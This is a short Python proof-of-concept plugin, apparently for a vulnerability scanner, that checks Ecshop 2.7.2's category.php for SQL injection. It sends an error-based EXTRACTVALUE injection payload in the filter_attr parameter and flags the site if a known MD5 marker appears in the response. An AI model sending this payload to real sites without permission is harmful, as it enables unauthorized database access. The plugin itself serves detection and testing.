#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :Ecshop 2.7.2 /category.php SQL注入漏洞 POC
"""
def assign(service, arg):
    if service == "ecshop":
        return True, arg

def audit(arg):
    payload = "/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71%2c(MID((IFNULL(CAST(md5(3.1415)%20AS%20CHAR)%2c0x20))%2c1%2c50))%2c0x7172737471))"
    url = arg + payload
    code, head, res, errcode,_ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.example.com/')[1])
